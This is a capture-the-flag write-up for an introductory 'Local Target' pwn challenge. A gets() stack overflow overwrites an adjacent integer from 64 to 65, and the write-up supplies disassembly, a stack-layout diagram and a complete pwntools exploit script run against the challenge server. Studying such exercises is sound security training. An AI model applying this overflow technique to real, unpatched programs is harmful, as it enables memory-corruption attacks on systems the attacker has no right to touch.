# CyLab — Local Target

* **Platform:** CyLab Security Academy / picoCTF 2024 (Challenge ID: `399`)
* **Category:** Binary Exploitation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `local-target` (x86_64 ELF)

---

## TL;DR

A stack buffer overflow via `gets()` allows modifying an adjacent local integer variable without corrupting the saved base pointer or return address. The binary defines `char input[16]` at `[rbp-0x20]` and `int num = 64` at `[rbp-0x8]`. By sending 24 bytes of padding followed by a single byte `'A'` (`0x41` / decimal 65), the least significant byte of `num` is overwritten from `0x40` to `0x41`, fulfilling the condition `if (num == 65)` and granting the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file local-target
local-target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=local-target
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **Unbounded Input Function:** The binary uses the deprecated and insecure `gets()` function.
2. **Stack Canary Absent:** No stack cookies protect local variables from contiguous overwrite.
3. **Target Variable in Local Frame:** The flag condition checks a local stack variable (`num`) rather than demanding control flow redirection.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char input[16];
    int num = 64;

    printf("Enter a string: ");
    gets(input);                // VULNERABILITY: Unbounded stack read

    if (num == 65) {
        printf("You win! Flag: ");
        // Reads and displays flag.txt
    } else {
        printf("num is %d, try again.\n", num);
    }
    return 0;
}
```

### 2. Disassembly & Stack Layout

Disassembling `main` in GDB:

```asm
0x00000000004011bd <+23>:   mov    DWORD PTR [rbp-0x8], 0x40     ; num = 64
0x00000000004011c4 <+30>:   lea    rax, [rbp-0x20]               ; input buffer
0x00000000004011c8 <+34>:   mov    rdi, rax
0x00000000004011cb <+37>:   call   0x401040 <gets@plt>
0x00000000004011d0 <+42>:   cmp    DWORD PTR [rbp-0x8], 0x41     ; compare num with 65 (0x41)
0x00000000004011d4 <+46>:   jne    0x4011f0 <main+74>
```

The stack frame structure:

```text
       Lower Addresses (Stack Top)
  +----------------------------------+  [rbp - 0x20]
  |          input[16]               |  (16 bytes)
  +----------------------------------+  [rbp - 0x10]
  |       Compiler Padding           |  (8 bytes)
  +----------------------------------+  [rbp - 0x08]
  |           num (int)              |  (4 bytes: 0x00000040)
  +----------------------------------+  [rbp - 0x04]
  |       Compiler Padding           |  (4 bytes)
  +----------------------------------+  [rbp]
  |         Saved RBP                |  (8 bytes)
  +----------------------------------+  [rbp + 0x08]
  |      Saved Return Address        |  (8 bytes)
  +----------------------------------+
       Higher Addresses
```

Distance calculation from buffer to `num`:
$$\text{Offset} = (rbp - 0x08) - (rbp - 0x20) = 0x20 - 0x08 = 24 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

1. **Stack Memory Inspection:**
   `input` occupies bytes $0$ to $15$. Compiler alignment creates an 8-byte gap between `input` and `num`.
2. **Partial Overwrite Advantage:**
   In little-endian architecture, the 32-bit integer `num = 64` (`0x00000040`) is represented in memory as:
   ```text
   \x40 \x00 \x00 \x00
   ```
   The first byte at `[rbp - 0x08]` is the least significant byte (`0x40`).
   Sending exactly 24 padding bytes followed by `'A'` (`0x41` in ASCII) overwrites only this byte, producing `0x00000041` (65) in memory while leaving the higher-order zero bytes intact.
3. **Payload:**
   ```python
   payload = b"A" * 24 + b"A"   # Exactly 25 bytes
   ```

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 15682

def solve(io):
    io.recvuntil(b"Enter a string:")
    # 24 bytes padding + 1 byte 'A' (0x41) = 25 bytes
    io.sendline(b"A" * 25)
    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./local-target") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 15682: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 15682
```

---

## Key Takeaways & Lessons

1. **Local Variable Corruption vs. Control Flow Hijacking:** When a binary contains internal logic gates or check conditions controlling privileged paths, modifying local stack variables directly is often simpler and cleaner than hijacking `rip`.
2. **Endianness and Partial Overwrite:** On little-endian architectures, overwriting only the lower bytes of multi-byte numbers preserves the upper bytes, enabling precise value modification without needing to supply exact null bytes that might terminate input strings.
3. **Accounting for Alignment Gaps:** Compilers often insert padding between structures and variables to satisfy alignment requirements (e.g. 4-byte or 8-byte boundaries). Verifying stack offsets in disassembly avoids off-by-one errors.
